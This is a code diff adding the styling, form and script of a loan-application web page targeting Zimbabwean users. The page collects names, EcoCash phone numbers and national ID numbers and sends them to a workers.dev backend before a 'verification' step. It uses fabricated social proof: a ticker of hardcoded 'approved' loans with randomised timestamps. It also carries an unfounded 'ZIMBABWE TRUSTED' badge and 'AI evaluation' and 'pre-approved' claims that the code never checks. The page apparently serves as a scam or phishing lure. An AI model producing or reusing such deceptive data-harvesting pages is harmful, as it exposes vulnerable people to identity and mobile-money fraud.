@@ -36,4 +36,272 @@
       filter: blur(2px);
     }
     @keyframes flagwave {
-      
+      0%   { background-position: 0 0; }
+      100% { background-position: 0 60px; }
+    }
+
+    /* Floating gold & green glow orbs */
+    .orb { position: fixed; border-radius: 50%; filter: blur(60px); z-index: 0; pointer-events: none; opacity: 0.35; }
+    .orb.g { width: 300px; height: 300px; background: var(--zw-green); top: -80px; left: -80px; animation: drift1 12s ease-in-out infinite alternate; }
+    .orb.y { width: 260px; height: 260px; background: var(--zw-gold); bottom: -60px; right: -60px; animation: drift2 14s ease-in-out infinite alternate; }
+    .orb.r { width: 200px; height: 200px; background: var(--zw-red); top: 40%; left: 60%; animation: drift1 10s ease-in-out infinite alternate-reverse; }
+    @keyframes drift1 { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(50px,40px) scale(1.15); } }
+    @keyframes drift2 { 0% { transform: translate(0,0) scale(1); } 100% { transform: translate(-40px,-50px) scale(1.1); } }
+
+    .container { width: 100%; max-width: 520px; position: relative; z-index: 1; padding-top: 12px; }
+
+    /* Zimbabwe flag stripe bar */
+    .flag-bar {
+      height: 10px; border-radius: 6px; margin-bottom: 14px;
+      background: linear-gradient(180deg,
+        var(--zw-green) 0 16.6%, var(--zw-gold) 16.6% 33.3%, var(--zw-red) 33.3% 50%,
+        var(--zw-black) 50% 66.6%, var(--zw-red) 66.6% 83.3%, var(--zw-gold) 83.3% 100%);
+      background-size: 100% 200%;
+      animation: flashbar 3s linear infinite;
+      box-shadow: 0 0 15px rgba(255,184,28,0.4);
+    }
+    @keyframes flashbar {
+      0%   { filter: brightness(0.8); }
+      50%  { filter: brightness(1.6); }
+      100% { filter: brightness(0.8); }
+    }
+
+    /* Live Ticker */
+    .ticker {
+      background: rgba(0,0,0,0.55); border: 1px solid rgba(255,184,28,0.35);
+      padding: 8px 14px; border-radius: 50px; display: flex; align-items: center; gap: 10px;
+      font-size: 12px; color: var(--muted); margin-bottom: 16px; backdrop-filter: blur(10px);
+    }
+    .dot {
+      width: 8px; height: 8px; background: var(--zw-green); border-radius: 50%;
+      box-shadow: 0 0 10px var(--zw-green), 0 0 20px var(--zw-gold);
+      animation: pulse 1.2s infinite;
+    }
+    @keyframes pulse { 0%,100% { transform: scale(0.9); opacity: 0.8; } 50% { transform: scale(1.25); opacity: 1; } }
+
+    .card {
+      background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px;
+      padding: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.7), 0 0 30px rgba(49,156,55,0.15);
+      backdrop-filter: blur(20px); position: relative; overflow: hidden;
+    }
+    /* shine sweep across the card */
+    .card::after {
+      content: ''; position: absolute; top: 0; left: -120%; width: 60%; height: 100%;
+      background: linear-gradient(105deg, transparent, rgba(255,184,28,0.08), transparent);
+      animation: shine 5s ease-in-out infinite;
+      pointer-events: none;
+    }
+    @keyframes shine { 0%, 60% { left: -120%; } 100% { left: 180%; } }
+
+    .badge {
+      display: inline-block; padding: 4px 12px; border-radius: 50px; font-size: 11px;
+      font-weight: 700; letter-spacing: 1px; color: #111; margin-bottom: 10px;
+      background: linear-gradient(90deg, var(--zw-gold), var(--zw-green));
+      animation: badgeflash 2s ease-in-out infinite;
+    }
+    @keyframes badgeflash {
+      0%,100% { box-shadow: 0 0 8px rgba(255,184,28,0.5); }
+      50%     { box-shadow: 0 0 22px rgba(49,156,55,0.9), 0 0 35px rgba(255,184,28,0.6); }
+    }
+
+    h2 {
+      font-size: 25px; font-weight: 800; margin-bottom: 4px;
+      background: linear-gradient(90deg, var(--zw-green), var(--zw-gold), var(--zw-red), var(--zw-gold), var(--zw-green));
+      background-size: 300% 100%;
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      animation: titleflow 5s linear infinite;
+    }
+    @keyframes titleflow { 0% { background-position: 0% 50%; } 100% { background-position: 300% 50%; } }
+    p { color: var(--muted); font-size: 13px; margin-bottom: 20px; }
+
+    .group { margin-bottom: 16px; }
+    label { display: block; font-size: 12px; font-weight: 600; color: var(--muted); margin-bottom: 6px; letter-spacing: 0.5px; }
+    input, select {
+      width: 100%; padding: 13px 14px; background: rgba(0,0,0,0.6);
+      border: 1px solid rgba(255,255,255,0.12); border-radius: 12px;
+      color: var(--text); font-size: 14px; outline: none; transition: 0.3s;
+    }
+    input:focus, select:focus {
+      border-color: var(--zw-gold);
+      box-shadow: 0 0 14px rgba(255,184,28,0.4), 0 0 4px rgba(49,156,55,0.6);
+    }
+
+    .calc {
+      background: rgba(0,0,0,0.5); border: 1px solid rgba(255,184,28,0.25);
+      padding: 18px; border-radius: 14px; text-align: center; margin-bottom: 18px;
+      box-shadow: inset 0 0 20px rgba(49,156,55,0.1);
+    }
+    .amount {
+      font-size: 36px; font-weight: 800; margin: 6px 0;
+      background: linear-gradient(135deg, var(--zw-green), var(--zw-gold));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      animation: amtflash 2.5s ease-in-out infinite;
+    }
+    @keyframes amtflash { 0%,100% { filter: brightness(0.9); } 50% { filter: brightness(1.35); } }
+    input[type="range"] {
+      width: 100%; height: 6px; -webkit-appearance: none;
+      background: linear-gradient(90deg, var(--zw-green), var(--zw-gold), var(--zw-red));
+      border-radius: 4px; accent-color: var(--zw-gold);
+    }
+    .bounds { display: flex; justify-content: space-between; font-size: 11px; color: #8a8a96; margin-top: 6px; }
+
+    .hint {
+      margin-top: 10px; font-size: 12px; color: var(--zw-gold);
+      min-height: 16px; font-weight: 600;
+    }
+
+    .terms { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: var(--muted); margin: 18px 0; }
+    .terms input { width: auto; margin-top: 2px; accent-color: var(--zw-green); }
+
+    button {
+      width: 100%; padding: 16px;
+      background: linear-gradient(135deg, var(--zw-green), var(--zw-gold));
+      background-size: 200% 100%;
+      border: none; border-radius: 12px; color: #111; font-size: 15px; font-weight: 800;
+      cursor: pointer; animation: btnflash 2s ease-in-out infinite; transition: 0.3s;
+    }
+    @keyframes btnflash {
+      0%,100% { box-shadow: 0 0 15px rgba(49,156,55,0.4); background-position: 0% 50%; }
+      50%     { box-shadow: 0 0 30px rgba(255,184,28,0.7); background-position: 100% 50%; }
+    }
+    button:hover { transform: translateY(-2px) scale(1.01); }
+    button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+  </style>
+</head>
+<body>
+<div class="flag-bg"></div>
+<div class="orb g"></div><div class="orb y"></div><div class="orb r"></div>
+
+<div class="container">
+  <div class="flag-bar"></div>
+
+  <div class="ticker">
+    <div class="dot"></div>
+    <span id="tickerText">USD 1,500 loan approved in Harare 2 mins ago</span>
+  </div>
+
+  <div class="card">
+    <div class="badge">🇿🇼 ZIMBABWE TRUSTED</div>
+    <h2>Instant AI Evaluation</h2>
+    <p>Secure automated loan application portal</p>
+
+    <form id="form">
+      <div class="group"><label>Full Name</label><input name="fullName" placeholder="Tendai Moyo" required></div>
+      <div class="group"><label>EcoCash Phone Number</label><input name="phone" type="tel" placeholder="+263 77..." required></div>
+      <div class="group"><label>National ID Number</label><input name="nationalId" placeholder="63-1234567-A-63" required></div>
+
+      <div class="group">
+        <label>Employment Status</label>
+        <select name="employment" required>
+          <option>Employed</option><option>Self-employed</option><option>Business owner</option><option>Unemployed</option>
+        </select>
+      </div>
+
+      <!-- Monthly income NOW comes BEFORE the loan amount -->
+      <div class="group"><label>Monthly Net Income (USD)</label><input name="income" id="income" type="number" min="0" placeholder="1200" required></div>
+
+      <!-- Loan amount is calculated from the income entered above -->
+      <div class="calc">
+        <label>Your Pre-Approved Loan Offer</label>
+        <div class="amount" id="display">USD 1,000</div>
+        <input id="slider" name="loanAmount" type="range" min="1000" max="5000" step="500" value="1000">
+        <div class="bounds"><span id="minLabel">USD 1,000</span><span id="maxLabel">USD 5,000</span></div>
+        <div class="hint" id="hint">Enter your monthly income to unlock your full offer 🚀</div>
+      </div>
+
+      <div class="group">
+        <label>Repayment Timeline</label>
+        <select name="repayment" required>
+          <option>1 month</option><option>3 months</option><option selected>6 months</option><option>12 months</option><option>24 months</option>
+        </select>
+      </div>
+
+      <div class="terms">
+        <input type="checkbox" id="terms" required>
+        <label for="terms">I confirm accuracy and agree to automated credit scoring protocols.</label>
+      </div>
+
+      <button type="submit" id="btn">Proceed to Verification</button>
+    </form>
+  </div>
+
+  <div class="flag-bar" style="margin-top:14px;"></div>
+</div>
+
+<script>
+  const slider  = document.getElementById('slider');
+  const display = document.getElementById('display');
+  const income  = document.getElementById('income');
+  const hint    = document.getElementById('hint');
+  const minLabel = document.getElementById('minLabel');
+  const maxLabel = document.getElementById('maxLabel');
+
+  const fmt = n => 'USD ' + Number(n).toLocaleString();
+  const round500 = n => Math.max(500, Math.round(n / 500) * 500);
+
+  function updateSlider() {
+    display.textContent = fmt(slider.value);
+  }
+
+  // When income is entered, calculate the loan offer:
+  //  - Minimum is always ABOVE 500 USD (set to 1,000 minimum)
+  //  - Maximum = 3x monthly income (capped at 50,000)
+  income.addEventListener('input', () => {
+    const inc = Number(income.value) || 0;
+    if (inc <= 0) {
+      slider.min = 1000; slider.max = 5000; slider.value = 1000;
+      minLabel.textContent = fmt(1000);
+      maxLabel.textContent = fmt(5000);
+      hint.textContent = 'Enter your monthly income to unlock your full offer 🚀';
+    } else {
+      const minLoan = Math.max(1000, round500(inc * 0.5));   // not too low — always above 500
+      const maxLoan = Math.min(50000, round500(inc * 3));    // up to 3x income, capped
+      slider.min = minLoan;
+      slider.max = Math.max(maxLoan, minLoan + 500);
+      slider.step = 500;
+      slider.value = minLoan;
+      minLabel.textContent = fmt(minLoan);
+      maxLabel.textContent = fmt(slider.max);
+      hint.textContent = '✅ Based on USD ' + inc.toLocaleString() + '/month income — borrow up to 3× your income!';
+    }
+    updateSlider();
+  });
+
+  slider.oninput = updateSlider;
+  updateSlider();
+
+  const ticker = document.getElementById('tickerText');
+  const items = ["USD 1,500 approved in Harare", "USD 3,000 approved in Bulawayo", "USD 800 approved in Gweru"];
+  let i = 0;
+  setInterval(() => { ticker.textContent = items[i = (i + 1) % items.length] + " (" + Math.floor(Math.random()*5+1) + "m ago)"; }, 4000);
+
+  document.getElementById('form').onsubmit = async (e) => {
+    e.preventDefault();
+    const f = e.target, btn = document.getElementById('btn');
+    const data = {
+      full_name: f.fullName.value.trim(),
+      phone: f.phone.value.trim(),
+      national_id: f.nationalId.value.trim(),
+      loan_amount: Number(f.loanAmount.value),
+      employment_status: f.employment.value,
+      monthly_income: Number(f.income.value),
+      repayment_period: f.repayment.value
+    };
+    btn.disabled = true; btn.textContent = 'Processing...';
+    try {
+      const res = await fetch('https://quickcash-backend.doviaskipmoi.workers.dev/applications', {
+        method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data)
+      });
+      const json = await res.json();
+      if (!res.ok || !json.success) throw new Error(json.message || 'Failed');
+      sessionStorage.setItem('applicationId', json.application_id);
+      sessionStorage.setItem('applicationPhone', data.phone);
+      location.href = 'verify.html';
+    } catch(err) {
+      alert(err.message || 'Submission error');
+      btn.disabled = false; btn.textContent = 'Proceed to Verification';
+    }
+  };
+</script>
+</body>
+</html>
